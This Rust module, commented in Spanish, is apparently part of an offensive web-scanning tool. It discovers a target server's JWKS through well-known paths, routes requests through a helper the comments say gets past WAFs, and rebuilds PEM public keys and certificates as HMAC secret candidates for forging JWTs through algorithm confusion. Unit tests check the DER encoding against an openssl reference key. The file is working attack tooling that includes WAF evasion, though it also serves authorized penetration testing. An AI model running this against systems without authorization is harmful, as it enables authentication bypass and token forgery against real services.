// SPDX-License-Identifier: LicenseRef-Propietario
//! JWKS → material para la CONFUSIÓN DE ALGORITMO (arnm, molde `alg-confusion`).
//!
//! El servidor verifica RS256 con una clave PÚBLICA publicada (JWKS / openid-configuration).
//! Si una librería JWT naíf verifica un token HS256 con ESA misma clave pública como secreto
//! HMAC, el token se forja con material público. Este módulo (1) DESCUBRE la JWKS y (2) deriva
//! los CANDIDATOS de secreto HMAC — la representación exacta que el server usa varía por
//! librería, así que se emiten varias: el PEM SubjectPublicKeyInfo reconstruido de `(n,e)`, y
//! —si hay `x5c`— el PEM del certificado. Todo GET no destructivo (estatuto detector).
//!
//! El reconstructor `(n,e) → PEM` es ASN.1/DER hecho a mano (sin dep de RSA); se valida contra
//! un PEM de referencia generado por `openssl` (dir. 33: referencia INDEPENDIENTE, no contra sí).

/// base64 ESTÁNDAR (alfabeto `+/` con padding) para el cuerpo PEM. Propio (sin dep). Puro.
fn b64_std(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0];
        let b1 = *chunk.get(1).unwrap_or(&0);
        let b2 = *chunk.get(2).unwrap_or(&0);
        out.push(T[(b0 >> 2) as usize] as char);
        out.push(T[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);
        out.push(if chunk.len() > 1 { T[(((b1 & 0x0f) << 2) | (b2 >> 6)) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[(b2 & 0x3f) as usize] as char } else { '=' });
    }
    out
}

/// Longitud DER (forma definida). Puro.
fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        return vec![n as u8];
    }
    let mut b = Vec::new();
    let mut v = n;
    while v > 0 {
        b.insert(0, (v & 0xff) as u8);
        v >>= 8;
    }
    let mut out = vec![0x80 | b.len() as u8];
    out.extend(b);
    out
}

/// INTEGER DER de un entero big-endian SIN signo: quita ceros a la izquierda y antepone `0x00`
/// si el bit alto queda puesto (para que el ASN.1 lo lea POSITIVO). Puro.
fn der_integer(bytes: &[u8]) -> Vec<u8> {
    let mut i = 0;
    while i + 1 < bytes.len() && bytes[i] == 0 {
        i += 1;
    }
    let body = &bytes[i..];
    let mut content = Vec::with_capacity(body.len() + 1);
    if body.first().is_some_and(|b| b & 0x80 != 0) {
        content.push(0x00);
    }
    content.extend_from_slice(body);
    let mut out = vec![0x02];
    out.extend(der_len(content.len()));
    out.extend(content);
    out
}

/// Reconstruye el PEM `SubjectPublicKeyInfo` de una RSA pubkey a partir de `(n,e)` crudos
/// (big-endian) — lo que produce `openssl rsa -pubout`. Puro y determinista.
pub fn jwk_rsa_a_pem(n: &[u8], e: &[u8]) -> String {
    // RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
    let mut rsa_body = der_integer(n);
    rsa_body.extend(der_integer(e));
    let mut rsa_seq = vec![0x30];
    rsa_seq.extend(der_len(rsa_body.len()));
    rsa_seq.extend(rsa_body);
    // BIT STRING { 0x00 unused-bits, RSAPublicKey }
    let mut bit_content = vec![0x00];
    bit_content.extend(rsa_seq);
    let mut bitstr = vec![0x03];
    bitstr.extend(der_len(bit_content.len()));
    bitstr.extend(bit_content);
    // AlgorithmIdentifier { rsaEncryption OID, NULL } — constante.
    const ALG: [u8; 15] = [
        0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00,
    ];
    // SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey }
    let mut spki_body = ALG.to_vec();
    spki_body.extend(bitstr);
    let mut spki = vec![0x30];
    spki.extend(der_len(spki_body.len()));
    spki.extend(spki_body);

    let b64 = b64_std(&spki);
    let mut pem = String::from("-----BEGIN PUBLIC KEY-----\n");
    for chunk in b64.as_bytes().chunks(64) {
        pem.push_str(std::str::from_utf8(chunk).unwrap());
        pem.push('\n');
    }
    pem.push_str("-----END PUBLIC KEY-----\n");
    pem
}

/// Envuelve un DER de certificado (`x5c[0]`, ya en base64 estándar) como PEM CERTIFICATE —
/// otra representación que algunas librerías usan como secreto de confusión. Puro.
pub fn x5c_a_pem(der_b64: &str) -> String {
    let limpio: String = der_b64.split_whitespace().collect();
    let mut pem = String::from("-----BEGIN CERTIFICATE-----\n");
    for chunk in limpio.as_bytes().chunks(64) {
        pem.push_str(std::str::from_utf8(chunk).unwrap_or(""));
        pem.push('\n');
    }
    pem.push_str("-----END CERTIFICATE-----\n");
    pem
}

/// Extrae los CANDIDATOS de secreto HMAC (bytes) de un JSON JWKS. Por cada clave RSA: el PEM
/// SPKI de `(n,e)` y —si hay— el PEM del `x5c`. Devuelve vacío si el JSON no es una JWKS.
pub fn candidatos_de_jwks(json: &str) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let Ok(v) = serde_json::from_str::<serde_json::Value>(json) else {
        return out;
    };
    let keys = v.get("keys").and_then(|k| k.as_array());
    let claves = keys.cloned().unwrap_or_else(|| vec![v.clone()]); // acepta una sola clave suelta
    for k in claves {
        if k.get("kty").and_then(|x| x.as_str()) != Some("RSA") {
            continue;
        }
        if let (Some(n_b64), Some(e_b64)) = (
            k.get("n").and_then(|x| x.as_str()),
            k.get("e").and_then(|x| x.as_str()),
        ) {
            if let (Some(n), Some(e)) = (
                crate::autenticacion::base64url_decode(n_b64),
                crate::autenticacion::base64url_decode(e_b64),
            ) {
                let bytes = jwk_rsa_a_pem(&n, &e).into_bytes();
                if !out.contains(&bytes) {
                    out.push(bytes);
                }
            }
        }
        if let Some(cert) = k.get("x5c").and_then(|x| x.as_array()).and_then(|a| a.first()).and_then(|c| c.as_str()) {
            let bytes = x5c_a_pem(cert).into_bytes();
            if !out.contains(&bytes) {
                out.push(bytes);
            }
        }
    }
    out
}

/// `jwks_uri` de un JSON de openid-configuration. Puro.
pub fn jwks_uri_de(json: &str) -> Option<String> {
    serde_json::from_str::<serde_json::Value>(json)
        .ok()?
        .get("jwks_uri")?
        .as_str()
        .map(String::from)
}

/// El origen (`scheme://host[:port]`) de una URL. Puro.
pub fn origen_de(url: &str) -> String {
    let (esquema, resto) = url.split_once("://").unwrap_or(("https", url));
    let host = resto.split(['/', '?', '#']).next().unwrap_or(resto);
    format!("{esquema}://{host}")
}

/// DESCUBRE la JWKS de un origen (openid-configuration → `jwks_uri`, y rutas jwks directas) y
/// devuelve los candidatos de secreto para confusión. Vía `fetch_evasion` (cruza WAF). Vacío
/// si el origen no publica JWKS. No destructivo (solo GET).
pub async fn descubrir_candidatos(
    cliente: &reqwest::Client,
    origen: &str,
    curl_impersonate_path: &str,
) -> Vec<Vec<u8>> {
    let base = origen.trim_end_matches('/');
    let mut cands: Vec<Vec<u8>> = Vec::new();
    let push = |nuevos: Vec<Vec<u8>>, acc: &mut Vec<Vec<u8>>| {
        for c in nuevos {
            if !acc.contains(&c) {
                acc.push(c);
            }
        }
    };
    // 1) openid-configuration / oauth-authorization-server → jwks_uri.
    for disc in [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
    ] {
        let r = crate::impersonate::fetch_evasion(cliente, &format!("{base}{disc}"), &[], curl_impersonate_path, 12).await;
        if let Some(uri) = jwks_uri_de(&r.body) {
            let jr = crate::impersonate::fetch_evasion(cliente, &uri, &[], curl_impersonate_path, 12).await;
            push(candidatos_de_jwks(&jr.body), &mut cands);
        }
    }
    // 2) rutas JWKS directas.
    for jw in ["/.well-known/jwks.json", "/jwks.json", "/.well-known/jwks"] {
        let r = crate::impersonate::fetch_evasion(cliente, &format!("{base}{jw}"), &[], curl_impersonate_path, 12).await;
        push(candidatos_de_jwks(&r.body), &mut cands);
    }
    cands
}

#[cfg(test)]
mod tests {
    use super::*;

    // Vector de REFERENCIA generado con `openssl genrsa 2048` (independiente del codificador).
    const N_B64URL: &str = "1U7loz5JUPxOW41rQB5ROikGVsfV3bTvJwN26XonRmq4qpXDR5msTJUI62fGx4gv9dcp1BQnQp57ovKk6poRnOfYmwQn9jKbsybBcvTaL9fKP4sJyRw0nmVFVi8gu5cOIxtYbhNwB-k8kretKlB_Xn7m_HMnNAt1UXs4lEsCVbWPqbYNuyf9cEqUPYAjm4ojgzXSV8SoIw9RZTULdeHnGTMqagWAEerLOO8HN4imz6_ABrpci6zeAq8WiB2BIzqW3VUBPmbEXmYnngSf9kMqU5T_Mi3P4DqO7IHAU5bLYmu53gcO_dcYhxyWZk2GevtG6cM2YKHkNipowzQPpY5A2Q";
    const E_B64URL: &str = "AQAB";
    const PEM_REF: &str = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1U7loz5JUPxOW41rQB5R\nOikGVsfV3bTvJwN26XonRmq4qpXDR5msTJUI62fGx4gv9dcp1BQnQp57ovKk6poR\nnOfYmwQn9jKbsybBcvTaL9fKP4sJyRw0nmVFVi8gu5cOIxtYbhNwB+k8kretKlB/\nXn7m/HMnNAt1UXs4lEsCVbWPqbYNuyf9cEqUPYAjm4ojgzXSV8SoIw9RZTULdeHn\nGTMqagWAEerLOO8HN4imz6/ABrpci6zeAq8WiB2BIzqW3VUBPmbEXmYnngSf9kMq\nU5T/Mi3P4DqO7IHAU5bLYmu53gcO/dcYhxyWZk2GevtG6cM2YKHkNipowzQPpY5A\n2QIDAQAB\n-----END PUBLIC KEY-----\n";

    #[test]
    fn jwk_a_pem_reproduce_el_pem_de_openssl() {
        let n = crate::autenticacion::base64url_decode(N_B64URL).unwrap();
        let e = crate::autenticacion::base64url_decode(E_B64URL).unwrap();
        let pem = jwk_rsa_a_pem(&n, &e);
        assert_eq!(pem, PEM_REF, "el PEM reconstruido debe ser IDÉNTICO al de openssl");
    }

    #[test]
    fn candidatos_extrae_la_clave_rsa() {
        let jwks = format!("{{\"keys\":[{{\"kty\":\"RSA\",\"n\":\"{N_B64URL}\",\"e\":\"{E_B64URL}\",\"kid\":\"1\"}}]}}");
        let cands = candidatos_de_jwks(&jwks);
        assert_eq!(cands.len(), 1, "una clave RSA → un candidato");
        assert_eq!(cands[0], PEM_REF.as_bytes(), "el candidato es el PEM SPKI");
        // ROJO (pareja, dir. 33): un JSON que no es JWKS no produce candidatos.
        assert!(candidatos_de_jwks("{\"hola\":1}").is_empty());
        assert!(candidatos_de_jwks("no-json").is_empty());
    }

    #[test]
    fn der_integer_antepone_cero_si_bit_alto() {
        // 0x80 tiene el bit alto puesto → DER antepone 0x00 para leerlo positivo.
        assert_eq!(der_integer(&[0x80]), vec![0x02, 0x02, 0x00, 0x80]);
        // 0x7F no → sin 0x00.
        assert_eq!(der_integer(&[0x7F]), vec![0x02, 0x01, 0x7F]);
        // ceros a la izquierda se quitan.
        assert_eq!(der_integer(&[0x00, 0x00, 0x01]), vec![0x02, 0x01, 0x01]);
    }

    #[test]
    fn origen_de_url() {
        assert_eq!(origen_de("https://api.x.com/v1/user?a=1"), "https://api.x.com");
        assert_eq!(origen_de("http://h:8080/p"), "http://h:8080");
    }
}
